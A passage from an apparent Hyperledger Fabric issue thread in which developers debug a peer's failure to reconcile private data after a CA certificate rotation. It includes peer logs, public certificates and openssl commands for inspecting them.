ESC[34m2019-11-14 01:41:59.400 UTC [committer.txvalidator] Validate -> INFO 081ESC[0m [dlbp-org2] Validated block [10] in 1ms
ESC[31m2019-11-14 01:41:59.400 UTC [cauthdsl] deduplicate -> ERRO 082ESC[0m Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
ESC[31m2019-11-14 01:41:59.400 UTC [cauthdsl] deduplicate -> ERRO 083ESC[0m Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
ESC[34m2019-11-14 01:41:59.417 UTC [kvledger] CommitWithPvtData -> INFO 084ESC[0m [dlbp-org2] Committed block [10] with 1 transaction(s) in 16ms (state_validation=3ms block_and_pvtdata_commit=0ms state_commit=11ms) commitHash=[29dfa28ed6ec4765f60f19ef488e67b7e4b039ffd002b4b0c134b79ea337f472]
{code}
... whereas on peer2 I have the following for the same block:
{code:java}
ESC[34m2019-11-14 12:59:11.227 UTC [committer.txvalidator] Validate -> INFO 73131ESC[0m [dlbp-org2] Validated block [10] in 1ms
ESC[31m2019-11-14 12:59:11.227 UTC [cauthdsl] deduplicate -> ERRO 73132ESC[0m Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
ESC[31m2019-11-14 12:59:11.227 UTC [cauthdsl] deduplicate -> ERRO 73133ESC[0m Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
ESC[33m2019-11-14 12:59:11.227 UTC [gossip.privdata] listMissingPrivateData -> WARN 73134ESC[0m Removed custodiancc custodian_permanent hash 0baa7b83873cccfb3cd1b98b816511576639e74f8e574f092a00941c7cc9d7b7 from the data passed to the ledger
ESC[33m2019-11-14 12:59:11.227 UTC [gossip.privdata] listMissingPrivateData -> WARN 73135ESC[0m Removed dlbpcc dlbp_permanent hash 27ec951c1b1e025c1ce73f44e8ee0a80a7027782fe2f891ec7b6b3f8148f93db from the data passed to the ledger
ESC[34m2019-11-14 12:59:11.247 UTC [kvledger] CommitWithPvtData -> INFO 73136ESC[0m [dlbp-org2] Committed block [10] with 1 transaction(s) in 19ms (state_validation=5ms block_and_pvtdata_commit=1ms state_commit=12ms) commitHash=[29dfa28ed6ec4765f60f19ef488e67b7e4b039ffd
{code}
Sending you block 10 in a bit.;;;","14/Nov/19 11:42 PM;silveraid;Compared two blocks, one of them is before the channel config update (so the private data does not sync over), and another one which is after (so the private data syncs) and I could not spot any obvious (at least to me) issue.;;;","15/Nov/19 10:30 PM;silveraid;I have also tried to increase the channel capabilities from V1_3 to V1_4_3, and the orderer from V1_1 to V1_4_2, the application capabilities had to stay on 1_3 unfortunately for now, but I am not sure if it has anything to do with private data reconciliation. These changes does not seems to make any difference.

 

Made another effort by adding CA certificates from network A to network B's peer msp folder, but this also did not make any difference.;;;","16/Nov/19 12:13 AM;silveraid;I did a full debug on the peer and at this point I still think that this is an issue, here is the interesting part of the log:
{code:java}
[36m2019-11-15 13:57:19.815 UTC [msp] GetManagerForChain -> DEBU e0c[0m Returning existing manager for channel 'dlbp-org2'
[36m2019-11-15 13:57:19.815 UTC [msp] DeserializeIdentity -> DEBU e0d[0m Obtaining identity
[36m2019-11-15 13:57:19.815 UTC [msp.identity] newIdentity -> DEBU e0e[0m Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICOjCCAeGgAwIBAgIUUQSzuweLvgbYkyP4aIoVWdAqfCcwCgYIKoZIzj0EAwIw
WzEQMA4GA1UEBxMHZnJhbmstYjEkMCIGA1UEChMbU2VjdXJlS2V5IFRlY2hub2xv
Z2llcyBJbmMuMQswCQYDVQQLEwJjYTEUMBIGA1UEAxMLUGVlck9yZzJDQTEwHhcN
MTkxMTE1MTM0MzAwWhcNMjQxMTEzMTM0NzAwWjBcMQswCQYDVQQGEwJVUzEXMBUG
A1UECBMOTm9ydGggQ2Fyb2xpbmExFDASBgNVBAoTC0h5cGVybGVkZ2VyMQ0wCwYD
VQQLEwRwZWVyMQ8wDQYDVQQDDAZwZWVyX2EwWTATBgcqhkjOPQIBBggqhkjOPQMB
BwNCAATjYX7APLxac6NaYk2mJenxn+5Fx3cGda0kLfOlYPwS211VTrbE82gMxP5M
0jepWtmSf4RBkzl0LDxq1xfTaln9o4GBMH8wDgYDVR0PAQH/BAQDAgeAMAwGA1Ud
EwEB/wQCMAAwHQYDVR0OBBYEFHN3TJk5DyNvM5+RXGAaO2+HqT9GMB8GA1UdIwQY
MBaAFAIAE5QVIw7cYH+c6HglZcktLOLDMB8GA1UdEQQYMBaCFHBlZXItcGVlcm9y
ZzItMjAwMTNhMAoGCCqGSM49BAMCA0cAMEQCIB+NyoQ389xtOBPjBDN5VFqnJrir
gLxWpT8yHdd346OgAiBiQI2hX/qtyZ2/IAFadYpAmYTLtXsCqA/VzpQ3BVxsPQ==
-----END CERTIFICATE-----
[31m2019-11-15 13:57:19.815 UTC [cauthdsl] deduplicate -> ERRO e0f[0m Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
[36m2019-11-15 13:57:19.815 UTC [cauthdsl] func1 -> DEBU e10[0m 0xc000287020 gate 1573826239815882442 evaluation starts
[36m2019-11-15 13:57:19.815 UTC [cauthdsl] func2 -> DEBU e11[0m 0xc000287020 signed by 0 principal evaluation starts (used [false])
[36m2019-11-15 13:57:19.815 UTC [cauthdsl] func2 -> DEBU e12[0m 0xc000287020 principal evaluation fails
[36m2019-11-15 13:57:19.815 UTC [cauthdsl] func1 -> DEBU e13[0m 0xc000287020 gate 1573826239815882442 evaluation fails
[36m2019-11-15 13:57:19.815 UTC [gossip.privdata] isEligible -> DEBU e14[0m Skipping namespace custodiancc collection custodian_permanent because we're not eligible for the private data
[36m2019-11-15 13:57:19.815 UTC [gossip.privdata] inspectTransaction -> DEBU e15[0m Peer is not eligible for collection, channel [dlbp-org2], chaincode [custodiancc], collection name [custodian_permanent], txID [a1fa38977087749a2d74e702b0e1d58bab847a2bc23d30bfd89ca73d89f91e88] the policy is [&privdata.SimpleCollection{name:""custodian_permanent"", accessPolicy:(*cauthdsl.policy)(0xc002ed2d80), memberOrgs:[]string{""PeerOrg2""}, conf:common.StaticCollectionConfig{Name:""custodian_permanent"", MemberOrgsPolicy:(*common.CollectionPolicyConfig)(0xc0031f6c30), RequiredPeerCount:0, MaximumPeerCount:1, BlockToLive:0x0, MemberOnlyRead:false, Type:0, TimeToLive:"""", XXX_NoUnkeyedLiteral:struct {}{}, XXX_unrecognized:[]uint8(nil), XXX_sizecache:0}}]. Skipping.

{code}
So it simply says that: we are not eligible for the private data.

My assumption is that my peer's certificate cannot be validated against the CAs which are currently in the channel configuration as the synchronization process have not progressed that far so the private data is just simply rejected.;;;","16/Nov/19 4:48 AM;yacovm;Yeah, this sounds about right. However, since we're the same organization, we should be eligible of the data during reconciliation regardless of the fact we rotated a CA certificate, simply because our organization has always been in that collection. [~denyeart] am I wrong?;;;","16/Nov/19 4:50 AM;yacovm;This means, [~silveraid] - that if you don't get this data eventually - it's a bug. Do you get the data after a while? like, after an hour or so? ;;;","16/Nov/19 5:04 AM;silveraid;I have this peer joined to the network and it is up for 6 hours now and it still does not have the data. I thought that reconciliation is a much quicker process. Does it need anything to trigger this process?;;;","16/Nov/19 5:08 AM;yacovm;It is a quicker process... I just said 1 hour as some upper bound. 
Can you supply debug logs of the peer during a 1 hour time frame so we can try and see why it doesn't sync up ?;;;","16/Nov/19 7:00 AM;silveraid;Debug is on, will attach the logs in a bit.;;;","16/Nov/19 7:11 AM;silveraid;So while waiting for more logs I have picked up this, right after block 9 was committed. Block 9 in this test was the last block on the channel:
{code:java}
2019-11-15 13:57:21.923 UTC [gossip.privdata] StoreBlock -> INFO 12d6 [dlbp-org2] Fetched all missing collection private write sets from remote peers for block [9] (2007ms) 
2019-11-15 13:57:21.923 UTC [gossip.privdata] StoreBlock -> DEBU 12d7 [dlbp-org2] Added 2 namespace private write sets for block [9], tran [0] 
2019-11-15 13:58:13.441 UTC [gossip.privdata] run -> DEBU 3851 Start reconcile missing private info 
2019-11-15 13:58:13.441 UTC [gossip.privdata] reconcile -> DEBU 3853 Reconciliation cycle finished successfully. no items to reconcile
{code}
I see the same message repeating it over and over again in every 70 seconds approximately:
{noformat}
2019-11-15 22:03:13.571 UTC [gossip.privdata] run -> DEBU 83baf Start reconcile missing private info 
2019-11-15 22:03:13.571 UTC [gossip.privdata] reconcile -> DEBU 83bb1 Reconciliation cycle finished successfully. no items to reconcile
{noformat};;;","16/Nov/19 7:22 AM;silveraid;Logs have been attached, had to split them up due to the filesize limit is being set to 10MB. It is about 15 minutes but I think you will find what you are looking for.;;;","16/Nov/19 7:46 AM;yacovm;I'm sorry but I need more logs, especially from the moment the peer committed the private data transaction onwards.

Also, a sanity check question - it doesn't recognize PeerOrg1 and PeerOrg3  in channel dblp-org2 because I guess there is only org 2 in that channel ? is that it? ;;;","16/Nov/19 8:28 AM;yacovm;and I can't stand this ugly printing of identities.... 

{quote}2019-11-15 22:15:54.691 UTC [peer.gossip.sa] OrgByPeerIdentity -> DEBU f7704 Failed deserialization identity [0a 08 50 65 65 72 4f 72 67 33 12 c2 06 2d 2d 2d 2d 2d 42 45 47 49 4e 20 43 45 52 54 49 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a 4d 49 49 43 4f 6a 43 43 41 65 47 67 41 77 49 42 41 67 49 55 42 5a 37 52 79 37 34 31 4a 56 34 51 67 6d 6a 49 6f 33 79 48 4b 51 63 4e 2f 74 49 77 43 67 59 49 4b 6f 5a 49 7a 6a 30 45 41 77 49 77 0a 57 7a 45 51 4d 41 34 47 41 31 55 45 42 78 4d 48 5a 6e 4a 68 62 6d 73 74 59 6a 45 6b 4d 43 49 47 41 31 55 45 43 68 4d 62 55 32 56 6a 64 58 4a 6c 53 32 56 35 49 46 52 6c 59 32 68 75 62 32 78 76 0a 5a 32 6c 6c 63 79 42 4a 62 6d 4d 75 4d 51 73 77 43 51 59 44 56 51 51 4c 45 77 4a 6a 59 54 45 55 4d 42 49 47 41 31 55 45 41 78 4d 4c 55 47 56 6c 63 6b 39 79 5a 7a 4e 44 51 54 45 77 48 68 63 4e 0a 4d 54 6b 78 4d 54 45 31 4d 54 4d 30 4d 7a 41 77 57 68 63 4e 4d 6a 51 78 4d 54 45 7a 4d 54 4d 30 4f 44 41 77 57 6a 42 63 4d 51 73 77 43 51 59 44 56 51 51 47 45 77 4a 56 55 7a 45 58 4d 42 55 47 0a 41 31 55 45 43 42 4d 4f 54 6d 39 79 64 47 67 67 51 32 46 79 62 32 78 70 62 6d 45 78 46 44 41 53 42 67 4e 56 42 41 6f 54 43 30 68 35 63 47 56 79 62 47 56 6b 5a 32 56 79 4d 51 30 77 43 77 59 44 0a 56 51 51 4c 45 77 52 77 5a 57 56 79 4d 51 38 77 44 51 59 44 56 51 51 44 44 41 5a 77 5a 57 56 79 58 32 4d 77 57 54 41 54 42 67 63 71 68 6b 6a 4f 50 51 49 42 42 67 67 71 68 6b 6a 4f 50 51 4d 42 0a 42 77 4e 43 41 41 54 4d 53 38 6e 4e 66 64 68 44 51 6b 33 57 46 43 7a 45 71 6e 30 50 72 7a 50 42 76 73 57 2b 52 6e 72 46 41 7a 67 34 36 4c 4f 4f 37 58 59 37 32 6e 63 48 49 38 6b 70 37 31 43 42 0a 75 68 71 63 41 50 62 4b 4f 49 76 59 59 2f 42 48 62 76 68 30 62 58 54 55 6c 6e 33 59 6f 34 47 42 4d 48 38 77 44 67 59 44 56 52 30 50 41 51 48 2f 42 41 51 44 41 67 65 41 4d 41 77 47 41 31 55 64 0a 45 77 45 42 2f 77 51 43 4d 41 41 77 48 51 59 44 56 52 30 4f 42 42 59 45 46 46 72 34 41 73 4c 72 53 67 36 35 6b 56 6b 49 65 79 33 7a 32 62 51 64 4f 64 4c 34 4d 42 38 47 41 31 55 64 49 77 51 59 0a 4d 42 61 41 46 4d 64 72 35 44 62 62 66 64 30 4b 69 78 49 32 51 51 52 52 79 4d 4f 76 6c 4d 59 31 4d 42 38 47 41 31 55 64 45 51 51 59 4d 42 61 43 46 48 42 6c 5a 58 49 74 63 47 56 6c 63 6d 39 79 0a 5a 7a 4d 74 4d 6a 41 77 4d 6a 4e 6a 4d 41 6f 47 43 43 71 47 53 4d 34 39 42 41 4d 43 41 30 63 41 4d 45 51 43 49 42 4f 64 30 7a 76 70 37 4f 63 6e 71 2b 30 49 4e 32 65 6d 34 38 72 66 46 2f 6a 67 0a 46 76 31 39 43 6a 7a 69 71 66 6b 77 42 33 4d 55 41 69 42 33 4d 6d 6b 62 6d 4d 6f 68 44 77 69 58 68 43 77 47 57 4d 6a 69 73 2f 30 72 58 39 2f 54 38 45 33 45 2b 4f 57 67 56 6b 30 64 36 51 3d 3d 0a 2d 2d 2d 2d 2d 45 4e 44 20 43 45 52 54 49 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a] on [dlbp-org2]: [MSP PeerOrg3 is unknown]
{quote}


I made FAB-17095 ;;;","18/Nov/19 11:22 PM;silveraid;Hi [~yacovm], attached org2netb_join_debug.txt compressed and split into parts. It has all logs since the peer starts for a good period of time. Peer joins to dlbp-org2 channel first and then a channel called ""consortium"" to avoid a lot of TLS errors.;;;","18/Nov/19 11:40 PM;yacovm;thanks but can you also provide the corresponding last configuration block ? I want to look at the CA certificates in it. ;;;","18/Nov/19 11:47 PM;silveraid;Sure, attached dlbp-org2_current_config.json.;;;","19/Nov/19 12:07 AM;yacovm;OK now in the config block you provided there are 2 root CA certs:
{code:java}
yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNERENDQWJPZ0F3SUJBZ0lVZUptSk4ycStpKzRqVElFVUVjSytUYlF1YTlzd0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WVRFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TWpVMk1EQmFGdzB6TkRFeE1UUXhNalUyTURCYU1HTXhFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0V4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFVQpNQklHQTFVRUN4TUxWbVZ5YVdacFpXUXVUV1V4RXpBUkJnTlZCQU1UQ2xCbFpYSlBjbWN5UTBFd1dUQVRCZ2NxCmhrak9QUUlCQmdncWhrak9QUU1CQndOQ0FBUnUwVkJ0QUdwc3BxR3NmWVd4bWlKWjB0V05iVUZaYURsZVJLZVQKOU5BSWlCZDVJUVlaMVVleTlWdjhZcysxVUJvVU10QVdzajdLUU8rbVJiMVAxRTVzbzBVd1F6QU9CZ05WSFE4QgpBZjhFQkFNQ0FRWXdFZ1lEVlIwVEFRSC9CQWd3QmdFQi93SUJBVEFkQmdOVkhRNEVGZ1FVUlZUajY4UXo0cHNvClVRc2VVQ0NtYVZDeUxPTXdDZ1lJS29aSXpqMEVBd0lEUndBd1JBSWdGWjZDREp0NlYzUHh0TTd3UlRXMk9XbU8KUndDRnlnSGI1YnhISk5QaTZwNENJRUtzaWhqUzcyRHp0NFBnQjZ2QTcyMi8rOVZFQ3lkaElMSzNaYnl6VmFTMAotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="" | base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            78:99:89:37:6a:be:8b:ee:23:4c:81:14:11:c2:be:4d:b4:2e:6b:db
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-a, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 12:56:00 2019 GMT
            Not After : Nov 14 12:56:00 2034 GMT
        Subject: L=frank-a, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:6e:d1:50:6d:00:6a:6c:a6:a1:ac:7d:85:b1:9a:
                    22:59:d2:d5:8d:6d:41:59:68:39:5e:44:a7:93:f4:
                    d0:08:88:17:79:21:06:19:d5:47:b2:f5:5b:fc:62:
                    cf:b5:50:1a:14:32:d0:16:b2:3e:ca:40:ef:a6:45:
                    bd:4f:d4:4e:6c
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:1
            X509v3 Subject Key Identifier: 
                45:54:E3:EB:C4:33:E2:9B:28:51:0B:1E:50:20:A6:69:50:B2:2C:E3
    Signature Algorithm: ecdsa-with-SHA256
         30:44:02:20:15:9e:82:0c:9b:7a:57:73:f1:b4:ce:f0:45:35:
         b6:39:69:8e:47:00:85:ca:01:db:e5:bc:47:24:d3:e2:ea:9e:
         02:20:42:ac:8a:18:d2:ef:60:f3:b7:83:e0:07:ab:c0:ef:6d:
         bf:fb:d5:44:0b:27:61:20:b2:b7:65:bc:b3:55:a4:b4
yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNEVENDQWJPZ0F3SUJBZ0lVUTA5cXl2Q2JWYm94V3VDQkJJSlVwWWJueTRFd0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WWpFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TXpFNU1EQmFGdzB6TkRFeE1UUXhNekU1TURCYU1HTXhFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0l4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFVQpNQklHQTFVRUN4TUxWbVZ5YVdacFpXUXVUV1V4RXpBUkJnTlZCQU1UQ2xCbFpYSlBjbWN5UTBFd1dUQVRCZ2NxCmhrak9QUUlCQmdncWhrak9QUU1CQndOQ0FBU2pLT2ZPd0xUY3p1U3R2T2JPZDNkY1M3NllDRHg5WW12V2JzaEMKUjk4bzhTZmdZY1F5RG1tbXhwWjR5WXRPelRPNDA3Q3hQTTBJVXExTlBiNE84VEQzbzBVd1F6QU9CZ05WSFE4QgpBZjhFQkFNQ0FRWXdFZ1lEVlIwVEFRSC9CQWd3QmdFQi93SUJBVEFkQmdOVkhRNEVGZ1FVM08rTHh0WGhqUkJtCmZsSGY4MWdJbzRQbTI3NHdDZ1lJS29aSXpqMEVBd0lEU0FBd1JRSWhBSWVlR1JmQzEwSE8vVFZHMExhMDJQU1oKandyamplU3BaaVRkQldLTFZTcnVBaUFRUFhKMGZvcmNkQS8zdjl3TGUxYjhVamhtaXhnd1ZtQ3Y0RlB1Z3NkeQp5QT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"" | base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            43:4f:6a:ca:f0:9b:55:ba:31:5a:e0:81:04:82:54:a5:86:e7:cb:81
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-b, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 13:19:00 2019 GMT
            Not After : Nov 14 13:19:00 2034 GMT
        Subject: L=frank-b, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:a3:28:e7:ce:c0:b4:dc:ce:e4:ad:bc:e6:ce:77:
                    77:5c:4b:be:98:08:3c:7d:62:6b:d6:6e:c8:42:47:
                    df:28:f1:27:e0:61:c4:32:0e:69:a6:c6:96:78:c9:
                    8b:4e:cd:33:b8:d3:b0:b1:3c:cd:08:52:ad:4d:3d:
                    be:0e:f1:30:f7
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:1
            X509v3 Subject Key Identifier: 
                DC:EF:8B:C6:D5:E1:8D:10:66:7E:51:DF:F3:58:08:A3:83:E6:DB:BE
    Signature Algorithm: ecdsa-with-SHA256
         30:45:02:21:00:87:9e:19:17:c2:d7:41:ce:fd:35:46:d0:b6:
         b4:d8:f4:99:8f:0a:e3:8d:e4:a9:66:24:dd:05:62:8b:55:2a:
         ee:02:20:10:3d:72:74:7e:8a:dc:74:0f:f7:bf:dc:0b:7b:56:
         fc:52:38:66:8b:18:30:56:60:af:e0:53:ee:82:c7:72:c8
{code}
and 4 intermediate certs:
{code:java}
yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNKVENDQWN5Z0F3SUJBZ0lVWWgwVSs0Tm4xalNWbmREVDlYNy9yVzIxaFBrd0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WVRFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TWpVMk1EQmFGdzB5TkRFeE1UWXhNekF4TURCYU1Gc3hFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0V4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFTApNQWtHQTFVRUN4TUNZMkV4RkRBU0JnTlZCQU1UQzFCbFpYSlBjbWN5UTBFeE1Ga3dFd1lIS29aSXpqMENBUVlJCktvWkl6ajBEQVFjRFFnQUVWMXBjYzJXOVpwNnZWNWFZR3prcFpUdlZkZmJVVzZmbUpMTmFRdmZianNOaHpYV0MKeGpQSkdncEFlY1RhVkNMamJkWkRuWlV4NmNGdmJrRjBxREZ1T0tObU1HUXdEZ1lEVlIwUEFRSC9CQVFEQWdFRwpNQklHQTFVZEV3RUIvd1FJTUFZQkFmOENBUUF3SFFZRFZSME9CQllFRkQvRmJQMnh5aG1CRHpxZlR5NFUvS0dGCjE4RURNQjhHQTFVZEl3UVlNQmFBRkVWVTQrdkVNK0tiS0ZFTEhsQWdwbWxRc2l6ak1Bb0dDQ3FHU000OUJBTUMKQTBjQU1FUUNJRUNjVEZXU0RWaTFvZXMzUkZ3RTZWK1NlZHdlRm0vVk9DL1I0djJHbEVzL0FpQU1PM1pPRXM1TwpGbUhyY3htTzFBbWxyeDNxRTNDcEowTitFRmhaem5xMmdBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="" |  base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            62:1d:14:fb:83:67:d6:34:95:9d:d0:d3:f5:7e:ff:ad:6d:b5:84:f9
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-a, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 12:56:00 2019 GMT
            Not After : Nov 16 13:01:00 2024 GMT
        Subject: L=frank-a, O=SecureKey Technologies Inc., OU=ca, CN=PeerOrg2CA1
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:57:5a:5c:73:65:bd:66:9e:af:57:96:98:1b:39:
                    29:65:3b:d5:75:f6:d4:5b:a7:e6:24:b3:5a:42:f7:
                    db:8e:c3:61:cd:75:82:c6:33:c9:1a:0a:40:79:c4:
                    da:54:22:e3:6d:d6:43:9d:95:31:e9:c1:6f:6e:41:
                    74:a8:31:6e:38
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                3F:C5:6C:FD:B1:CA:19:81:0F:3A:9F:4F:2E:14:FC:A1:85:D7:C1:03
            X509v3 Authority Key Identifier: 
                keyid:45:54:E3:EB:C4:33:E2:9B:28:51:0B:1E:50:20:A6:69:50:B2:2C:E3

    Signature Algorithm: ecdsa-with-SHA256
         30:44:02:20:40:9c:4c:55:92:0d:58:b5:a1:eb:37:44:5c:04:
         e9:5f:92:79:dc:1e:16:6f:d5:38:2f:d1:e2:fd:86:94:4b:3f:
         02:20:0c:3b:76:4e:12:ce:4e:16:61:eb:73:19:8e:d4:09:a5:
         af:1d:ea:13:70:a9:27:43:7e:10:58:59:ce:7a:b6:80

yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNKVENDQWN5Z0F3SUJBZ0lVSzZhaFRsZGsxMUpXQnNnTDRRS3JpaERpbGVJd0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WWpFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TXpFNU1EQmFGdzB5TkRFeE1UWXhNekkwTURCYU1Gc3hFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0l4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFTApNQWtHQTFVRUN4TUNZMkV4RkRBU0JnTlZCQU1UQzFCbFpYSlBjbWN5UTBFeE1Ga3dFd1lIS29aSXpqMENBUVlJCktvWkl6ajBEQVFjRFFnQUVVVlFqaWdpelVCVDZ0WENkZmZmY0NwWGJTcU9pMjNLL0NFOTNLZTR0KzdLNnVGYUsKb3FEUjlUeEhJc29LTGJDdWY0U2VTMnBPNEZpTnl1emNiZVhCRzZObU1HUXdEZ1lEVlIwUEFRSC9CQVFEQWdFRwpNQklHQTFVZEV3RUIvd1FJTUFZQkFmOENBUUF3SFFZRFZSME9CQllFRkxINWJFUmMxbzI0eTJvWGQwSFUya3BQCjZDMDdNQjhHQTFVZEl3UVlNQmFBRk56dmk4YlY0WTBRWm41UjMvTllDS09ENXR1K01Bb0dDQ3FHU000OUJBTUMKQTBjQU1FUUNJRk5UVmZFaC9PRTk4VStwd0U4bkFxVWJaaWl6TzdhQk5hSU8rT04xc2cwL0FpQjlPVVhXak9YTApqUnN4Sk5qbWZaN0lIZ3g2TlRac1pzOThpNXRhVzJPWnpBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="" |  base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            2b:a6:a1:4e:57:64:d7:52:56:06:c8:0b:e1:02:ab:8a:10:e2:95:e2
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-b, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 13:19:00 2019 GMT
            Not After : Nov 16 13:24:00 2024 GMT
        Subject: L=frank-b, O=SecureKey Technologies Inc., OU=ca, CN=PeerOrg2CA1
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:51:54:23:8a:08:b3:50:14:fa:b5:70:9d:7d:f7:
                    dc:0a:95:db:4a:a3:a2:db:72:bf:08:4f:77:29:ee:
                    2d:fb:b2:ba:b8:56:8a:a2:a0:d1:f5:3c:47:22:ca:
                    0a:2d:b0:ae:7f:84:9e:4b:6a:4e:e0:58:8d:ca:ec:
                    dc:6d:e5:c1:1b
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                B1:F9:6C:44:5C:D6:8D:B8:CB:6A:17:77:41:D4:DA:4A:4F:E8:2D:3B
            X509v3 Authority Key Identifier: 
                keyid:DC:EF:8B:C6:D5:E1:8D:10:66:7E:51:DF:F3:58:08:A3:83:E6:DB:BE

    Signature Algorithm: ecdsa-with-SHA256
         30:44:02:20:53:53:55:f1:21:fc:e1:3d:f1:4f:a9:c0:4f:27:
         02:a5:1b:66:28:b3:3b:b6:81:35:a2:0e:f8:e3:75:b2:0d:3f:
         02:20:7d:39:45:d6:8c:e5:cb:8d:1b:31:24:d8:e6:7d:9e:c8:
         1e:0c:7a:35:36:6c:66:cf:7c:8b:9b:5a:5b:63:99:cc


